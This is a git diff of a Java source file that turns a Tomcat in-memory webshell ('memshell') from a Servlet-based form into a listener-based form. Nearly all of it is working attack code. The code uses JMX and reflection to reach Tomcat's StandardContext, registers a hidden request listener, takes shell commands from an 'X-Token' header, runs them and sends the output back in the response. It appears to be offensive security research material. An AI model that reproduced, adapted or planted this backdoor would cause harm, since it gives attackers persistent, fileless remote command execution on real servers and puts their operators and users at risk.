@@ -1,25 +1,23 @@
 package com.demo.memshell;
 
-import javax.servlet.*;
+import com.sun.jmx.mbeanserver.NamedObject;
+
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServletRequest;
 import java.io.InputStream;
 import java.io.PrintWriter;
 import java.lang.management.ManagementFactory;
 import java.lang.reflect.Field;
-import java.lang.reflect.Method;
 import java.util.Set;
 
 /**
  * @author Whoopsunix
- * JMX 注入 Tomcat Servlet 型内存马
+ * JMX 获取 StandardContext 注入 Tomcat Listener 型内存马
  * Tomcat 7 8 9
  */
-public class TSMSJMX implements Servlet {
-
-    final private static String NAME = "Whoopsunix";
-    final private static String pattern = "/WhoopsunixShell";
-
-    public TSMSJMX() {
+public class TomcatListenerJMXMS implements ServletRequestListener {
+    public TomcatListenerJMXMS() {
 
     }
 
@@ -29,7 +27,7 @@ public class TSMSJMX implements Servlet {
 //            javax.management.MBeanServer mbeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
             com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (com.sun.jmx.interceptor.DefaultMBeanServerInterceptor) getFieldValue(mbeanServer, "mbsInterceptor");
             com.sun.jmx.mbeanserver.Repository repository = (com.sun.jmx.mbeanserver.Repository) getFieldValue(defaultMBeanServerInterceptor, "repository");
-            Set<com.sun.jmx.mbeanserver.NamedObject> objectSet = repository.query(new javax.management.ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
+            Set<NamedObject> objectSet = repository.query(new javax.management.ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
             if (objectSet.size() == 0) {
                 // springboot 中是 Tomcat
                 objectSet = repository.query(new javax.management.ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
@@ -38,72 +36,35 @@ public class TSMSJMX implements Servlet {
                 javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
                 org.apache.catalina.authenticator.AuthenticatorBase authenticatorBase = (org.apache.catalina.authenticator.AuthenticatorBase) getFieldValue(dynamicMBean, "resource");
                 org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(authenticatorBase, "context");
-
-                // wrapper 封装
-                if (standardContext.findChild(NAME) == null) {
-                    org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
-                    wrapper.setName(NAME);
-                    Servlet servlet = new TSMSJMX();
-                    wrapper.setServletClass(servlet.getClass().getName());
-                    wrapper.setServlet(servlet);
-                    // 添加到 standardContext
-                    standardContext.addChild(wrapper);
-
-
-                    try{
-                        // M1 Servlet映射到URL模式
-                        // standardContext.addServletMapping(pattern,NAME);
-                        Method addServletMappingMethod = standardContext.getClass().getDeclaredMethod("addServletMapping", String.class, String.class);
-                        addServletMappingMethod.setAccessible(true);
-                        addServletMappingMethod.invoke(standardContext, pattern, NAME);
-                    } catch (NoSuchMethodException e) {
-                        // M2 Servlet3 新特性 Dynamic
-//                        javax.servlet.ServletRegistration.Dynamic registration = new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext);
-//                        registration.addMapping(pattern);
-                        Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
-                    }
-
-                }
+                TomcatListenerJMXMS listenerMemShell = new TomcatListenerJMXMS();
+                standardContext.addApplicationEventListener(listenerMemShell);
             }
-
         } catch (Exception e) {
         }
     }
 
+
     @Override
-    public void init(ServletConfig servletConfig) throws ServletException {
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
 
     }
 
     @Override
-    public ServletConfig getServletConfig() {
-        return null;
-    }
-
-    @Override
-    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         try {
-            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
+            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
             String header = httpServletRequest.getHeader("X-Token");
             if (header == null) {
                 return;
             }
             String result = exec(header);
-            PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("TSMSJMX injected");
+            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
+            PrintWriter printWriter = request.getResponse().getWriter();
+            printWriter.println("TomcatListenerJMXMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
         }
-    }
-
-    @Override
-    public String getServletInfo() {
-        return null;
-    }
-
-    @Override
-    public void destroy() {
 
     }
 
